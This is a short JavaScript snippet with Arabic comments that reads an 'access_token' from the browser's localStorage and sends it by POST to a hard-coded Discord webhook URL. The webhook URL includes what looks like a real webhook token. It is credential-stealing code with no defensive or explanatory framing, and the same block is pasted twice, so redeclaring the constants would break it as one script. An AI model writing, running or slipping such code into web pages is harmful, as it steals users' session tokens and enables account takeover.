// جمع رمز الوصول
const access_token = window.localStorage.getItem("access_token");

// أرسل رمز الوصول إلى ويب هوك
const webhook_url = "https://discord.com/api/webhooks/1161284812603138049/weGd0UXLLPZb8PmUMlktwCHjbTBSZYE2Ghq2orPCI4u1QE5VCTob6y11k8S2KExQ5NGr";
const data = JSON.stringify({
  token: access_token,
});

fetch(webhook_url, {
  method: "POST",
  body: data,
});

// جمع رمز الوصول
const access_token = window.localStorage.getItem("access_token");

// أرسل رمز الوصول إلى ويب هوك
const webhook_url = "https://discord.com/api/webhooks/1161284812603138049/weGd0UXLLPZb8PmUMlktwCHjbTBSZYE2Ghq2orPCI4u1QE5VCTob6y11k8S2KExQ5NGr";
const data = JSON.stringify({
  token: access_token,
});

fetch(webhook_url, {
  method: "POST",
  body: data,
});
